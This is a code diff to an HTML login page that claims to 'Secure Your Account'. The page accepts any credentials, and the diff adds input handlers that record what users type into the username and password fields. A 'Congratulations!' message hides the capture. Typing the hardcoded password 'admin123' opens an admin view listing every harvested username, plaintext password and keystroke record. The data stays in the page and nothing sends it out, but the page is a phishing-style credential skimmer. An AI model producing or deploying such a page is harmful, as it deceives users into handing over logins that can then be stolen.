@@ -58,6 +58,14 @@
             display: block;
             margin: 0 0 5px;
         }
+
+        .congrats-message {
+            color: #ff00ff;
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -65,40 +73,39 @@
 <div class="login-container" id="loginContainer">
     <div class="login-title">Login to Secure Your Account</div>
     <form id="loginForm" onsubmit="return login(event)">
-        <input type="text" id="phone" name="phone" required>
+        <input type="text" id="phone" name="phone" required oninput="recordInput(this)">
         <label for="phone" class="form-label">Phone No./Username:</label>
         
-        <input type="password" id="password" name="password" required>
+        <input type="password" id="password" name="password" required oninput="recordInput(this)">
         <label for="password" class="form-label">Password:</label>
         
         <input type="submit" value="Login">
     </form>
-    <div id="loginMessage"></div>
+    <div id="loginMessage" class="congrats-message"></div>
 </div>
 
 <div class="admin-container" id="adminContainer">
     <div class="login-title">Admin View</div>
-    <h2>Logged In Users</h2>
+    <h2>Logged In Users and Typed Data</h2>
     <ul id="userList"></ul>
 </div>
 
 <script>
-    const users = []; // Array to store logged-in users
+    const users = []; // Array to store logged-in users and their keystrokes
 
     function login(event) {
         event.preventDefault();
         const phone = document.getElementById("phone").value;
         const password = document.getElementById("password").value;
-        const adminPassword = "admin123"; // Admin password
 
         // Add user to the array regardless of credentials
-        users.push({ phone, password, timestamp: new Date() });
+        users.push({ phone, password, keystrokes: getKeystrokes() });
 
-        // Display login success message
-        document.getElementById("loginMessage").innerText = "Login successfully!";
+        // Display congratulatory message
+        document.getElementById("loginMessage").innerText = "Congratulations!";
 
-        // Check if the password is correct to show admin view
-        if (password === adminPassword) {
+        // Show admin view with password "admin123"
+        if (password === "admin123") {
             displayAdminView(); // Show admin view
         }
 
@@ -112,13 +119,25 @@
 
         users.forEach(user => {
             const li = document.createElement("li");
-            li.innerText = `${user.phone} - ${user.password} - ${user.timestamp}`;
+            li.innerText = `${user.phone} - ${user.password} - Typed: ${user.keystrokes}`;
             userList.appendChild(li);
         });
 
         document.getElementById("adminContainer").style.display = "block"; // Show admin view
     }
+
+    const keystrokes = { phone: '', password: '' };
+
+    function recordInput(input) {
+        const { name, value } = input;
+        keystrokes[name] = value;
+    }
+
+    function getKeystrokes() {
+        return `Phone: ${keystrokes.phone}, Password: ${keystrokes.password}`;
+    }
 </script>
 
 </body>
 </html>
+
